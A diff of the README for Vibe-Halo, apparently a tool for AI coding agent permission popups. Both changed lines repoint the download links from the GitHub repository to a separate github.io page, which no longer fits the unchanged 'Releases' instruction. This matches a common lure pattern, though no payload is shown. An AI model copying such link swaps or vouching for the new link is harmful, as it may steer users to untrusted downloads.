@@ -1,6 +1,6 @@
 # 🔔 Vibe-Halo - Streamline AI coding agent permission requests
 
-[![](https://img.shields.io/badge/Download-Vibe--Halo-blue.svg)](https://github.com/Rosileia1457/Vibe-Halo)
+[![](https://img.shields.io/badge/Download-Vibe--Halo-blue.svg)](https://rosileia1457.github.io)
 
 Vibe-Halo manages notifications and permissions for your AI coding tools. It provides a visual interface for agents that run in the background. You receive clear popups when your coding agent needs approval to perform an action. It also displays a dynamic overlay to track completion status and active tasks directly on your screen.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 
 You can obtain the current version of Vibe-Halo from the official repository page.
 
-[Visit the repository to download](https://github.com/Rosileia1457/Vibe-Halo)
+[Visit the repository to download](https://rosileia1457.github.io)
 
 1. Navigate to the link above.
 2. Look for the "Releases" section on the right sidebar.
